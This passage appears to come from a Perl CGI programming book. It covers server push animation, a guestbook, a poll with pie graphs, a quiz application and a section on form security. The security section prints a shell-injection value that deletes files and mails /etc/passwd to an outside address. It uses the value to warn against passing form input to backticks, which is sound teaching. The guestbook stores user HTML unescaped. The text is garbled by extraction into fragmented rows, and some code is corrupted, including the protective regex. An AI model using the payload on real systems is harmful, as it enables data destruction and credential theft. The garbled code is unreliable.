print `$fortune`; ,NA,NA
exit(0);,NA,NA
"This is a repeating document, because a ""Refresh:"" header is specified every time the program is executed. ",NA,NA
The program uses the UNIX ,NA,NA
fortune,NA,NA
" command, which generates a random fortune each time it is invoked.",NA,NA
Server Push,NA,NA
Server push animations can be created using the ,NA,NA
multipart/x-mixed-replace,NA,NA
" MIME type. The ""replace"" ",NA,NA
"indicates that each data packet replaces the previous data packet. As a result, you can make smooth ",NA,NA
animations. Here is the format in which this MIME type is used:,NA,NA
Content-type: multipart/x-mixed-,NA,NA
replace;boundary=End--End ,NA,NA
Content-type: image/gif ,NA,NA
Image #1,NA,NA
--End ,NA,NA
Content-type: image/gif ,NA,NA
Image #2,NA,NA
--End ,NA,NA
Content-type: image/gif ,NA,NA
Image #3,NA,NA
--End--,NA,NA
In the first ,NA,NA
Content-type,NA,NA
" declaration, we declare the ",NA,NA
multipart/x-mixed-replace,NA,NA
 content types and establish ,NA,NA
"""End"" as the boundary string. We then repeatedly display new images (declaring new content types of ",NA,NA
image/gif,NA,NA
"), ending each image with the ""--End"" string. The result is that the images are displayed one after ",NA,NA
another.,NA,NA
Let's look at an example that uses the server push mechanism.,NA,NA
#!/usr/local/bin/perl ,NA,NA
$| = 1; ,NA,NA
"$webmaster = ""shishir\@bu\.edu""; ",NA,NA
"$boundary_string = ""\n"" . ""--End"" . ""\n""; ",NA,NA
"$end_of_data = ""\n"" . ""--End--"" . ""\n""; ",NA,NA
$delay_time = 1;,NA,NA
"First, we define the boundary strings that need to be sent to the client. We also set the delay time between ",NA,NA
"images-- in this case, one second.",NA,NA
"@image_list = ( ""image_1.gif"", ",NA,NA
" ""image_2.gif"",",NA,NA
" ""image_3.gif"",",NA,NA
" ""image_4.gif"",",NA,NA
" ""image_5.gif""  ",NA,NA
);,NA,NA
All of the images that will be used in the animation are stored in the ,NA,NA
@image_list,NA,NA
 array. In this simple ,NA,NA
"example, we use only 5 images.",NA,NA
$browser = $ENV{'HTTP_USER_AGENT'}; ,NA,NA
if ($browser =~ m#^Mozilla/(1\.[^0]|[2-9])#) {,NA,NA
" print ""Content-type: multipart/x-mixed-replace;boundary=End"", ""\n"";",NA,NA
The name of the client browser is obtained using the environment variable HTTP_USER_AGENT. If the ,NA,NA
"browser is Netscape version 1.1 or higher, the multipart MIME type is sent to it, along with the initial ",NA,NA
"boundary string. (Netscape uses ""Mozilla"" as its user agent string.)",NA,NA
 for ($loop=0; $loop < scalar (@image_list); $loop++) { ,NA,NA
&open_and_display_GIF ($image_list[$loop]);,NA,NA
 print $boundary_string;,NA,NA
 sleep ($delay_time);,NA,NA
 },NA,NA
 print $end_of_data;,NA,NA
A loop is used to iterate through the,NA,NA
 image_list,NA,NA
 array. Each image is displayed using the ,NA,NA
open_and_display_GIF,NA,NA
" subroutine. A boundary is then sent to the client, and the program proceeds to sleep ",NA,NA
for the specified amount of time. It is important to print the boundary after the image ,NA,NA
and,NA,NA
 before the ,NA,NA
sleep ,NA,NA
"command to ensure that the server ""pushes"" the entire image to the client. The process is repeated for all the ",NA,NA
"images in the array. Finally, the terminating boundary string is sent to the client.",NA,NA
} else {,NA,NA
 &open_and_display_GIF ($image_list[0]); ,NA,NA
} ,NA,NA
exit(0);,NA,NA
"If the browser is not Netscape version 1.1 or higher, only the first image stored in the array is displayed.",NA,NA
sub open_and_display_GIF ,NA,NA
{,NA,NA
 local ($file) = @_;,NA,NA
 local ($content_length);,NA,NA
" if ( (open (FILE, ""<"" . $file)) ) {",NA,NA
 $content_length = (stat (FILE))[7];,NA,NA
" print ""Content-type: image/gif"", ""\n"";",NA,NA
" print ""Content-length: "", $content_length, ""\n\n"";",NA,NA
 print <FILE>;,NA,NA
 close (FILE);,NA,NA
 } else {,NA,NA
" &return_error (500, ""File Access Error"", ",NA,NA
" ""Cannot open graphic file $file!"");",NA,NA
 } ,NA,NA
},NA,NA
"This routine should be very familiar to you. First, it sends the ",NA,NA
image/gif,NA,NA
" MIME type, along with the length of ",NA,NA
"the image. Then, the image is printed to standard output.",NA,NA
"One final note: If you are using an NCSA server, it is better to create the CGI server push animation program ",NA,NA
"as a non-parsed header (""nph"") script, as described in ",NA,NA
"Chapter 3, ",NA,NA
Output from the Common Gateway Interface,NA,NA
.,NA,NA
"That way the server will not parse the HTTP headers, and instead will send the information directly to the ",NA,NA
"client. The main advantage of this is reduced ""jerkiness"" in the animation. Just to refresh your memory, you ",NA,NA
"need to name the script with an ""nph-"" prefix, and the first lines that are output from your script should be:",NA,NA
" print ""HTTP/1.0 200 OK"", ""\n"";",NA,NA
" print ""Content-type: multipart/x-mixed-replace;boundary=End"", ""\n""; ",NA,NA
CGI Examples with pgperl,NA,NA
Advanced Form Applications,NA,NA
7. Advanced Form Applications,NA,NA
Contents: ,NA,NA
Guestbook ,NA,NA
Survey/Poll and Pie Graphs ,NA,NA
Quiz/Test Form Application ,NA,NA
Security,NA,NA
"Four different CGI applications are presented in this chapter, all of which use queries and form information to ",NA,NA
produce some interesting documents with hypertext and graphics. These applications include:,"G 
  
 G 
  
 G",NA
Guestbook,NA,NA
: A form interface for users to leave comments on a particular Web page for other people to ,NA,NA
"see. The concepts behind the guestbook are very simple: Present a form to the user to fill out, process the ",NA,NA
"form information, and store it in a file.",NA,NA
Poll or a Survey,NA,NA
: A CGI program that allows you to solicit opinions from users and present them with a ,NA,NA
dynamically created pie graph illustrating the up-to-date results. This application involves displaying a ,NA,NA
form and manipulating and storing the form data into a format that we can read easily and quickly at a ,NA,NA
"later time. When the user elects to see the current results, we simply read in all of the data and graph it.",NA,NA
Quiz/Test,NA,NA
": A unique interface that shows you how to ""extend"" HTML by adding new tags! This CGI ",NA,NA
"application reads the specified data file consisting of tags to create quizzes (as well as regular HTML), ",NA,NA
"formats it to HTML, and sends it to the browser. It will also correct the quiz once the user completes it.",NA,NA
7.1 Guestbook,NA,NA
One of the most common applications on the Web is a guestbook. It is simply a form that allows visitors to ,NA,NA
enter some information about themselves. This information is placed in a file for everyone to see. Here are the ,NA,NA
steps that need to be taken to create a guestbook:,G,NA
"Display a form with such fields as name, email address, and comments",G,NA
Write a CGI program to decode the form,G,NA
Place the information in a file,NA,NA
The program begins as follows:,NA,NA
#!/usr/local/bin/perl ,NA,NA
"$webmaster = ""shishir\@bu\.edu""; ",NA,NA
$method = $ENV{'REQUEST_METHOD'}; ,NA,NA
$script = $ENV{'SCRIPT_NAME'}; ,NA,NA
$query  = $ENV{'QUERY_STRING'}; ,NA,NA
"$document_root = ""/usr/local/bin/httpd_1.4.2/public""; ",NA,NA
"$guest_file = ""/guestbook.html""; ",NA,NA
$full_path = $document_root . $guest_file;,NA,NA
"In this initialization code, the ",NA,NA
document_root,NA,NA
 variable is the directory that contains your HTML files. Set this ,NA,NA
variable to the value of ,NA,NA
DocumentRoot,NA,NA
", as defined in the ",NA,NA
srm.conf,NA,NA
 configuration file. The ,NA,NA
guest_file,NA,NA
 variable ,NA,NA
"contains the relative path to the guestbook file, relative to ",NA,NA
DocumentRoot,NA,NA
. And ,NA,NA
full_path,NA,NA
 represents the full path ,NA,NA
"to the guestbook file. It is very important to separate the full path from the relative path, as you will see in a ",NA,NA
moment.,NA,NA
$exclusive_lock = 2;,NA,NA
$unlock = 8;,NA,NA
The lock definitions are stored in the ,NA,NA
exclusive_lock,NA,NA
 and ,NA,NA
unlock,NA,NA
" variables, respectively.",NA,NA
"if ($method eq ""GET"") {",NA,NA
" if ($query eq ""add"") {",NA,NA
This program is coded slightly differently from the programs that you have seen in this book. Let's first see how ,NA,NA
this program can be accessed:,"G 
  
 G 
  
 G",NA
A URL of ,NA,NA
http://your.machine/cgi-bin/guestbook.pl?add,NA,NA
", using the ",NA,NA
GET,NA,NA
" method, will present a form for ",NA,NA
visitors to enter information.,NA,NA
A URL of ,NA,NA
http://your.machine/cgi-bin/guestbook.pl,NA,NA
", using the ",NA,NA
GET,NA,NA
" method, will display the actual ",NA,NA
"guestbook file. (The user can also see the guestbook file by opening that file directly, e.g., by accessing ",NA,NA
http://your.machine/guestbook.html,NA,NA
.),NA,NA
When the form is submitted using the ,NA,NA
POST,NA,NA
" method, this program decodes the information, and outputs a ",NA,NA
thank-you message.,NA,NA
"As you can see, this program is very versatile. It handles all tasks of the guestbook. You could just as easily ",NA,NA
split the program into its constituents: an ,NA,NA
HTML,NA,NA
" form, a program to display the guestbook (optional), and a ",NA,NA
program to decode the form information. There are advantages either way. Combining all tasks into the single ,NA,NA
"program ensures that all components of the program are in one place, and files cannot be accidentally ",NA,NA
"misplaced. On the other hand, separating them ensures that each component of the guestbook is independent, ",NA,NA
and can be modified without risking the integrity of the other components. It is matter of personal preference.,NA,NA
 $date_time = &get_date_time();,NA,NA
The ,NA,NA
get_date_time,NA,NA
 subroutine displays the current date and time.,NA,NA
" &MIME_header (""text/html"", ""Shishir Gundavaram's Guestbook"");",NA,NA
The ,NA,NA
MIME_header,NA,NA
 subroutine outputs a chosen ,NA,NA
MIME,NA,NA
" header, and sets the title of the document to the ",NA,NA
user-specified argument. The only reason for the subroutine is to make the program more compact.,NA,NA
 print <<End_Of_Guestbook_Form; ,NA,NA
This is a guestbook CGI script that allows people to leave some,NA,NA
information for others to see. Please enter all requested ,NA,NA
"information, <B>and</B> if you have a WWW server, enter the address",NA,NA
so a hypertext link can be created. ,NA,NA
<P> ,NA,NA
The current time is: $date_time ,NA,NA
<HR>,NA,NA
"First, an introductory message is displayed, along with the current date and time. (You cannot call subroutines ",NA,NA
"from within print ""blocks,"" so the ",NA,NA
get_date_time,NA,NA
 subroutine to get the date and time was called earlier and ,NA,NA
placed in the ,NA,NA
date_time,NA,NA
 variable.).,NA,NA
"<FORM METHOD=""POST""> ",NA,NA
<PRE> ,NA,NA
"<EM>Full Name</EM>:      <INPUT TYPE=""text"" NAME=""name"" SIZE=40> ",NA,NA
"<EM>Email Address</EM>:  <INPUT TYPE=""text"" NAME=""from"" SIZE=40> ",NA,NA
"<EM>WWW Server</EM>:     <INPUT TYPE=""text"" NAME=""www""  SIZE=40> ",NA,NA
</PRE> ,NA,NA
<P> ,NA,NA
<EM>Please enter the information that you'd like to add:</EM><BR> ,NA,NA
"<TEXTAREA ROWS=3 COLS=60 NAME=""comments""></TEXTAREA><P> ",NA,NA
"<INPUT TYPE=""submit"" VALUE=""Add to Guestbook""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear Information""><BR> ",NA,NA
<P> ,NA,NA
</FORM> ,NA,NA
<HR> ,NA,NA
End_Of_Guestbook_Form,NA,NA
"As you can see, there is no ",NA,NA
ACTION,NA,NA
 attribute to the ,NA,NA
<FORM>,NA,NA
 tag. By omitting the ,NA,NA
ACTION,NA,NA
" attribute, the ",NA,NA
browser defaults to sending the completed form to the current CGI program. The ,NA,NA
METHOD,NA,NA
 is set to ,NA,NA
POST,NA,NA
--as ,NA,NA
"we'll see later, this is how the guestbook program will know the form has been completed.",NA,NA
The various elements that comprise a form are output. The <PRE> tags align the text fields. ,NA,NA
Figure 7.1,NA,NA
 shows ,NA,NA
how a completed form is rendered by Netscape Navigator.,NA,NA
Figure 7.1: Guestbook form,NA,NA
"If there was no query specified, the guestbook data file is displayed for output.",NA,NA
 } else {,NA,NA
" if ( open(GUESTBOOK, ""<"" . $full_path) ) {",NA,NA
" flock (GUESTBOOK, $exclusive_lock);",NA,NA
The ,NA,NA
full_path,NA,NA
 variable contains the full path to the guestbook file. The main reason for storing the relative path ,NA,NA
"and full path separately is that hypertext anchors need the relative path, while the full path is needed to open the ",NA,NA
"file. Before you open any file, it is always a good idea to check that the file can be opened.",NA,NA
" &MIME_header (""text/html"", ""Here is my guestbook!"");",NA,NA
 while (<GUESTBOOK>) {,NA,NA
 print;,NA,NA
 },NA,NA
" flock (GUESTBOOK, $unlock);",NA,NA
 close(GUESTBOOK);,NA,NA
The loop iterates through each line of the file and displays it to standard output. ,NA,NA
Figure 7.2,NA,NA
 shows the output.,NA,NA
Figure 7.2: Guestbook output,NA,NA
 } else {,NA,NA
" &return_error (500, ""Guestbook File Error"",",NA,NA
" ""Cannot read from the guestbook file ",NA,NA
"[$full_path]."");",NA,NA
 },NA,NA
 },NA,NA
"If there were any problems opening the file, an error message is sent to the client. The ",NA,NA
return_error,NA,NA
 subroutine ,NA,NA
is the same as the one presented in ,NA,NA
"Chapter 4, ",NA,NA
Forms and CGI,NA,NA
.,NA,NA
"Remember the ""add"" form, in which the ",NA,NA
<FORM>,NA,NA
 tag used a ,NA,NA
METHOD,NA,NA
 of ,NA,NA
POST,NA,NA
? Here's where the form is ,NA,NA
processed. If the request method is ,NA,NA
POST,NA,NA
", it means that the user filled out the form, and submitted it back to this ",NA,NA
program.,NA,NA
"} elsif ($method eq ""POST"") { ",NA,NA
" if ( open (GUESTBOOK, "">>"" . $full_path) ) {",NA,NA
" flock (GUESTBOOK, $exclusive_lock);",NA,NA
 $date_time = &get_date_time();,NA,NA
 &parse_form_data (*FORM);,NA,NA
"Now we add the new entry to the guestbook. First, the program checks to see if it can write to the guestbook",NA,NA
"file. If there are no errors, the file is opened in append mode, and exclusively locked. The form information is ",NA,NA
decoded and placed in the ,NA,NA
FORM,NA,NA
 associative array. The ,NA,NA
parse_form_data,NA,NA
 subroutine in this program is slightly ,NA,NA
different than the one we've previously encountered in ,NA,NA
"Chapter 4, ",NA,NA
Forms and CGI,NA,NA
; it does not check for ,NA,NA
GET ,NA,NA
"requests, since the program only uses it for ",NA,NA
POST,NA,NA
.,NA,NA
" $FORM{'name'}  = ""Anonymous User""       if !$FORM{'name'}; ",NA,NA
$FORM{'from'}  = $ENV{'REMOTE_HOST'}    if !$FORM{'from'};,NA,NA
Above is a construct you might not have seen before. It is a simpler way of saying:,NA,NA
if (!$FORM{'name'}) {,NA,NA
" $FORM{'name'} = ""Anonymous User""; ",NA,NA
} ,NA,NA
if (!$FORM{'from'}) {,NA,NA
 $FORM{'from'}=$ENV{'REMOTE_HOST'}; ,NA,NA
},NA,NA
"In other words, the form variables ",NA,NA
name,NA,NA
 and ,NA,NA
from,NA,NA
" are checked for valid information. If the fields are empty, ",NA,NA
default information is stored.,NA,NA
 $FORM{'comments'} =~ s/\n/<BR>/g;,NA,NA
The information that the user entered in the ,NA,NA
<TEXTAREA>,NA,NA
 field is stored in comments. Every newline character ,NA,NA
is replaced by the ,NA,NA
HTML,NA,NA
 break tag. This ensures that the information is displayed correctly. Note that if the user ,NA,NA
enters ,NA,NA
HTML,NA,NA
" code (or SSI directives) as part of the comments, the code will be interpreted. This could be ",NA,NA
dangerous. See ,NA,NA
"Chapter 9, ",NA,NA
"Gateways, Databases, and Search/Index Utilities",NA,NA
", for an intricate regular expression ",NA,NA
"that ""escapes"" ",NA,NA
HTML,NA,NA
 code.,NA,NA
 print GUESTBOOK <<End_Of_Write; ,NA,NA
<P> ,NA,NA
<B>$date_time:</B><BR> ,NA,NA
Message from <EM>$FORM{'name'}</EM> at <EM>$FORM{'from'}</EM>: ,NA,NA
<P> ,NA,NA
$FORM{'comments'} ,NA,NA
End_Of_Write,NA,NA
"The user name, host, and comments, along with the current date and time, are written to the guestbook file.",NA,NA
 if ($FORM{'www'}) {,NA,NA
 print GUESTBOOK <<End_of_Web_Address;,NA,NA
<P> ,NA,NA
$FORM{'name'} can also be reached at: ,NA,NA
"<A HREF=""$FORM{'www'}"">$FORM{'www'}</A> ",NA,NA
End_of_Web_Address,NA,NA
 },NA,NA
" print GUESTBOOK ""<P><HR>"";",NA,NA
If an ,NA,NA
HTTP,NA,NA
" address was provided by the user, it is also displayed.",NA,NA
" flock (GUESTBOOK, $unlock);",NA,NA
 close(GUESTBOOK);,NA,NA
The file is unlocked and closed. It is very important to unlock and close the guestbook file to ensure that other ,NA,NA
people can access it.,NA,NA
"Finally, if all goes well, a thank-you message is displayed, as well as links to view the guestbook.",NA,NA
" &MIME_header (""text/html"", ""Thank You!"");",NA,NA
 print <<End_of_Thanks;,NA,NA
"Thanks for visiting my guestbook. If you would like to see the guestbook, ",NA,NA
"click <A HREF=""$guest_file"">here</A> (actual guestbook HTML file), or <A ",NA,NA
"HREF=""$script"">here</A> (guestbook script without a query).",NA,NA
End_of_Thanks,NA,NA
"If the program cannot write to the guestbook file, an error message is generated. Another error is sent if an ",NA,NA
invalid request method is used to access this CGI program.,NA,NA
 } else {,NA,NA
" &return_error (500, ""Guestbook File Error"",",NA,NA
" ""Cannot write to the guestbook file [$full_path]."")",NA,NA
 } ,NA,NA
} else {,NA,NA
" &return_error (500, ""Server Error"",",NA,NA
" ""Server uses unsupported method""); ",NA,NA
} ,NA,NA
exit(0);,NA,NA
The ,NA,NA
MIME_header,NA,NA
 subroutine simply displays a ,NA,NA
MIME,NA,NA
" header, as well as a title and heading for the document. ",NA,NA
"If the third argument is not specified, the heading will be the same as the title.",NA,NA
sub MIME_header ,NA,NA
{,NA,NA
" local ($mime_type, $title_string, $header) = @_;",NA,NA
 if (!$header) {,NA,NA
 $header = $title_string;,NA,NA
 },NA,NA
" print ""Content-type: "", $mime_type, ""\n\n"";",NA,NA
" print ""<HTML>"", ""\n"";",NA,NA
" print ""<HEAD><TITLE>"", $title_string, ""</TITLE></HEAD>"", ""\n"";",NA,NA
" print ""<BODY>"", ""\n"";",NA,NA
" print ""<H1>"", $header, ""</H1>"";",NA,NA
" print ""<HR>""; ",NA,NA
},NA,NA
The ,NA,NA
get_date_time,NA,NA
 subroutine returns the current date and time.,NA,NA
sub get_date_time ,NA,NA
{,NA,NA
" local ($months, $weekdays, $ampm, $time_string);",NA,NA
" $months = ""January/February/March/April/May/June/July/"" . ",NA,NA
" ""August/September/October/November/December"";",NA,NA
" $weekdays = ""Sunday/Monday/Tuesday/Wednesday/Thursday/Friday/Saturday""; ",NA,NA
"local ($sec, $min, $hour, $day, $nmonth, $year, $wday, $yday, $isdst)  = ",NA,NA
localtime(time);,NA,NA
The ,NA,NA
localtime,NA,NA
" function returns a nine-element array, which consists of the time, the date, and the present time ",NA,NA
"zone. In previous examples, we were using only the first three elements of this array; in this example, we're ",NA,NA
assigning all nine.,NA,NA
 if ($hour > 12) {,NA,NA
 $hour -= 12;,NA,NA
" $ampm = ""pm"";",NA,NA
 } else {,NA,NA
" $ampm = ""am"";",NA,NA
 },NA,NA
 if ($hour == 0) {,NA,NA
 $hour = 12;,NA,NA
 },NA,NA
 $year += 1900;,NA,NA
" $week  = (split(""/"", $weekdays))[$wday]; ",NA,NA
"$month = (split(""/"", $months))[$nmonth];",NA,NA
The week and the numerical month returned by the ,NA,NA
localtime,NA,NA
 function are zero based. The ,NA,NA
week,NA,NA
 variable is set ,NA,NA
to the alphanumeric weekday name by retrieving the string corresponding to the numerical weekday from the ,NA,NA
variable ,NA,NA
weekdays,NA,NA
. The same process is repeated to determine the alphanumeric month name.,NA,NA
},NA,NA
" $time_string = sprintf(""%s, %s %s, %s - %02d:%02d:%02d %s"", ",NA,NA
" $week, $month, $day, $year, ",NA,NA
 ,NA,NA
"$hour, $min, $sec, $ampm); return ($time_string);",NA,NA
"Finally, the date returned by the ",NA,NA
get_date_time,NA,NA
 subroutine is in the form of:,NA,NA
"Friday, August 18, 1995 - 02:07:45 pm",NA,NA
The last subroutine in the guestbook application is ,NA,NA
parse_form_data,NA,NA
.,NA,NA
sub parse_form_data ,NA,NA
{,NA,NA
 local (*FORM_DATA) = @_;,NA,NA
},NA,NA
" local ( $request_method, $post_info, @key_value_pairs,",NA,NA
" $key_value, $key, $value);",NA,NA
" read (STDIN, $post_info, $ENV{'CONTENT_LENGTH'});",NA,NA
" @key_value_pairs = split (/&/, $post_info);",NA,NA
 foreach $key_value (@key_value_pairs) {,NA,NA
" ($key, $value) = split (/=/, $key_value);",NA,NA
 $value =~ tr/+/ /;,NA,NA
" $value =~ s/%([\dA-Fa-f][\dA-Fa-f])/pack (""C"", hex ($1))/eg; if ",NA,NA
(defined($FORM_DATA{$key})) {,NA,NA
" $FORM_DATA{$key} = join (""\0"", $FORM_DATA{$key}, $value); ",NA,NA
} else {,NA,NA
 $FORM_DATA{$key} = $value;,NA,NA
 },NA,NA
 },NA,NA
"As mentioned earlier, this subroutine does not check for ",NA,NA
GET,NA,NA
" requests. There is no need to do so, because the",NA,NA
loop in the main program does the needed checking.,NA,NA
Animation,NA,NA
Survey/Poll and Pie Graphs,NA,NA
7.2 Survey/Poll and Pie Graphs,"Forms and CGI programs make it easier to conduct surveys and polls on the Web. Let's look at an application that 
 tabulates poll data and dynamically creates a pie graph illustrating the results.
  
 This application actually consists of three distinct parts:
  
 G   
 The 
 HTML
  document with the form for conducting the poll
  
 G   
 The CGI program, 
 ice_cream.pl
 , that processes the form results and places them in a data file
  
 G 
  
 The CGI program, 
 pie.pl
 , that reads the data file and displays the tabulated results either as a pie graph or as a text 
 table
  
 Here is the form that the user will see:
  
 <HTML><HEAD><TITLE>Ice Cream Survey</TITLE></HEAD> 
 <BODY> 
  
 <H1>Favorite Ice Cream Survey</H1> 
  
 <HR> 
  
 <FORM ACTION=""/cgi-bin/ice_cream.pl"" METHOD=""POST""> 
 What is your favorite flavor of ice cream?
  
 <P> 
  
 <INPUT TYPE=""radio"" NAME=""ice_cream"" VALUE=""Vanilla"" CHECKED>Vanilla<BR> 
 <INPUT TYPE=""radio"" NAME=""ice_cream"" VALUE=""Strawberry"">Strawberry<BR> 
 <INPUT TYPE=""radio"" NAME=""ice_cream"" VALUE=""Chocolate"">Chocolate<BR> 
 <INPUT TYPE=""radio"" NAME=""ice_cream"" VALUE=""Other"">Other<BR> 
  
 <P> 
  
 <INPUT TYPE=""submit"" VALUE=""Submit the survey""> 
  
 <INPUT TYPE=""reset""  VALUE=""Clear your choice""> 
  
 </FORM> 
  
 <HR> 
  
 If you would like to see the current results, click 
  
 <A HREF=""/cgi-bin/pie.pl/ice_cream.dat"">here</A>.
  
 </BODY> 
  
 </HTML>
  
 It is a simple form that asks a single question. The form is shown in 
 Figure 7.3
 .
  
 Figure 7.3: Ice cream form
  
 [Graphic: 
  
 Figure 7-3]
  
 Notice the use of extra path information in the 
 HREF
  anchor at the bottom of the form (see code above). This path 
 information represents the data file for this survey, 
 ice.cream.dat
 , and will be stored in the environment variable 
 PATH_INFO
 . We could have also used a query in the form of:
  
 <A HREF=""/cgi-bin/pie.pl?/ice_cream.dat"">here</A>.
  
 But since we are passing a filename, it seems more logical to pass the information as an extra path. If we were passing the",NA
Processing the Form,"The CGI program (
 ice_cream.pl
 ) decodes the form information, tabulates it, and adds it to the data file. The program does 
 not contain the form.
  
 The program begins as follows:
  
 #!/usr/local/bin/perl 
  
 $webmaster = ""shishir\@bu\.edu""; 
  
 $document_root = ""/usr/local/bin/httpd_1.4.2/public""; 
 $ice_cream_file = ""/ice_cream.dat""; 
  
 $full_path = $document_root . $ice_cream_file; 
  
 $exclusive_lock = 2; 
  
 $unlock = 8; 
  
 &parse_form_data(*poll); 
  
 $user_selection = $poll{'ice_cream'};
  
 The form information is placed in the 
 poll
  associative array. The 
 parse_form_data
  subroutine is the same one we used 
 previously. Since 
 parse_form_data
  decodes both 
 GET
  and 
 POST
  submissions, users can submit their favorite flavor either 
 with a 
 GET
  query or through a form. The 
 ice_cream
  field, which represents the user's selection, is stored in the 
 user_selection
  variable.
  
 if ( open (POLL, ""<"" . $full_path) ) {
  
  
  flock (POLL, $exclusive_lock);
  
  
  for ($loop=0; $loop < 3; $loop++) {
  
  
  
  $line[$loop] = <POLL>;
  
  
  
  $line[$loop] =~ s/\n$//;
  
  
  }
  
 The data file is opened in read mode, and exclusively locked. The loop retrieves the first three lines from the file and 
 stores it in the 
 line
  array. Newline characters at the end of each line are removed. We use a regular expression to remove 
 the last character rather than using the 
 chop
  operator, because the third line may or may not have a newline character 
 initially, and 
 chop
  would automatically remove the last character, creating a potential problem.
  
  @options = split (""::"", $line[0]);
  
  @data    = split (""::"", $line[1]);",NA
Drawing the Pie Chart,"The 
 pie.pl
  program reads the poll data file and outputs the results, as either a pie graph, or a simple text table, depending 
 on the browser capabilities. The program can be accessed with the following URL:
  
 http://your.machine/cgi-bin/pie.pl/ice_cream.dat
  
 where we use extra path information to specify 
 ice_cream.dat
  as the data file, located in the document root directory. On a 
 graphic browser such as Netscape Navigator, the pie graph will look like 
 Figure 7.4
 .
  
 Figure 7.4: Pie graph
  
 [Graphic: 
  
 Figure 7-4]
  
 The program begins as follows:
  
 #!/usr/local/bin/perl5 
  
 use GD; 
  
 $webmaster = ""shishir\@bu\.edu""; 
  
 $document_root = ""/usr/local/bin/httpd_1.4.2/public""; 
 &read_data_file (*slices, *slices_color, *slices_message); 
 $no_slices = &remove_empty_slices();
  
 The 
 gd
  graphics library is used to create the pie graph. The 
 read_data_file
  subroutine reads the information from the data 
 file and places the corresponding values in 
 slices
 , 
 slices_color
 , and 
 slices_message
  arrays. The 
 remove_empty_slices 
 subroutine checks these three arrays for any zero values within the data, and returns the number of non-zero data values 
 into the 
 no_slices
  variable.
  
 if ($no_slices == -1) {
  
  
  &no_data ();
  
 When all of the values in the data file are zeros, the
  remove_empty_slices
  subroutine returns a value of -1. If a -1 is 
 returned into the 
 no_slices
  variable, the 
 no_data
  subroutine is called to output a message explaining that there are no 
 results in the data file.
  
 } else {
  
  
  $nongraphic_browsers = 'Lynx|CERN-LineMode';
  
  
 $client_browser = $ENV{'HTTP_USER_AGENT'};
  
  
  if ($client_browser =~ /$nongraphic_browsers/) {
  
  
   
  &text_results();
  
  
  
  
  } else {
  
  
  
   
  &draw_pie ();
  
  
  
  } 
  
 } 
  
 exit(0);
  
 If the client browser supports graphics, the 
 draw_pie
  subroutine is called to display a pie graph. Otherwise, the 
 text_results 
 subroutine is called to display the results as text.",NA
7.3 Quiz/Test Form Application,"The application that we are about to discuss allows you to embed special tags within 
 HTML
  to create quizzes and tests. The
  
 program then parses the new tags to create valid forms.
  
 The special tags I designed for the quiz application are shown in 
 Table 7.1
 .
  
 Table 7.1: Special Tags for Quiz Application
  
 Tag 
  
 Use
  
 <QUIZ>
 , 
 </QUIZ> 
  
 start/end a quiz
  
 <QUESTION>
 , 
 </QUESTION>
 , 
 TYPE
 =""Text"", 
 TYPE
 =""Multiple"" start/end a question block, text field, multiple choice
  
 <ASK>
 , 
 </ASK> 
  
 start/end the question text
  
 <HINT>
 , 
 </HINT> 
  
 start/end hint text
  
 <ANSWER>
 , 
 </ANSWER> 
  
 start/end answer text
  
 <RESPONSE>
 , 
 </RESPONSE> 
 <CHOICE>
 , 
 </CHOICE>
  
 start/end response message 
  
 start/end multiple choice item
  
 Before I show the application, I'll show you how the tags are used. Here is an example:
  
 <HTML> 
  
 <HEAD><TITLE>CGI Quiz/Test Application</TITLE></HEAD> 
 <BODY> 
  
 <H1>World Wide Web Quiz</H1> 
  
 <HR> 
  
 <QUIZ>
  
 The 
 <QUIZ>
  tag represents the start of the quiz. It is similar to the 
 <FORM>
  tag. These new tags are similar to traditional 
 HTML
 , in that they ignore whitespace, and disregard the case of the string. You can also embed other 
 HTML
  tags through a 
 quiz, with the exception of 
 <FORM>
 .
  
 <QUESTION TYPE=""Text""> 
  
 <ASK>Who is credited with the invention of the World Wide Web?</ASK>
  
 The 
 <QUESTION>
  tag supports two types of questions: fill-in-the-blank (or ""text""), and multiple choice (or ""multiple""). 
 The actual question is displayed by the 
 <ASK>
  tag. Remember to close the 
 <ASK>
  tag with 
 </ASK>
 .
  
 <HINT>WWW was created at CERN</HINT> 
  
 <HINT>The inventor now works for <A HREF=""http://www.w3.org"">W3C</A> 
 at MIT</HINT>
  
 You can specify hints for the user with the 
 <HINT>
  tag. Notice the embedded hypertext anchor in the 
 <HINT>
  tag. The 
 only restriction with specifying hints is that they must all be grouped together in one place within the question.
  
 <ANSWER>Tim Berners-Lee</ANSWER>
  
 The answer to the question is stored within the 
 <ANSWER>
  and 
 </ANSWER>
  tags. You can have only one answer.",NA
7.4 Security,"When dealing with forms, it is extremely critical to check the data. A malicious user can embed shell 
  
 metacharacters--characters that have special meaning to the shell--in the form data. For example, here is a form that asks for 
 user name:
  
 <FORM ACTION=""/cgi-bin/finger.pl"" METHOD=""POST""> 
 <INPUT TYPE=""text"" NAME=""user"" SIZE=40> 
  
 <INPUT TYPE=""submit"" VALUE=""Get Information""> 
 </FORM>
  
 Here is the program to handle the form:
  
 #!/usr/local/bin/perl 
  
 &parse_form_data(*simple); 
  
 $user = $simple{'user'};
  
 The 
 parse_form_data
  subroutine is the same as the one we've been using throughout the book.
  
 print ""Content-type: text/plain"", ""\n\n""; 
  
 print ""Here are the results of your query: "", ""\n""; 
 print `/usr/local/bin/finger $user`;
  
 In Perl, you can execute shell commands by using the `
 command
  ` notation. In this case, the 
 finger
  command is executed 
 with the information specified by the user.
  
 print ""\n""; 
  
 exit (0);
  
 This is an extremely dangerous program! Do not use it! Imagine if a malicious user entered the following as the value of 
 user
 :
  
 ; rm * ; mail -s ""Ha Ha"" malicious@crack.net < /etc/passwd
  
 This would not only remove all the files in the current directory, but it would also mail the 
 /etc/passwd
  file on your system 
 to the malicious user. In order to avoid this type of problem, you should check the form value before placing it on the 
 command line. Here is the modification of the previous program:
  
 #!/usr/local/bin/perl 
  
 &parse_form_data(*simple); 
  
 $user = $simple{'user'}; 
  
 if ($user =~ /[;><&\*`\]/) {\n    [amp   ]\|return_error (500, ""CGI Program Alert"", 
 ""What are you trying to do?""); 
  
 } else {
  
  
  print ""Content-type: text/plain"", ""\n\n"";
  
  
  print ""Here are the results of your query: "", ""\n"";
  
  
  print `/usr/local/bin/finger $user`;
  
  
  print ""\n""; 
  
 }",NA
8. Multiple Form Interaction,NA,NA
Contents: ,NA,NA
Hidden Fields ,NA,NA
CGI Side Includes,NA,NA
Netscape Persistent Cookies,NA,NA
"One of the problems with the current HTTP protocol is its inability to maintain state. In other words, the ",NA,NA
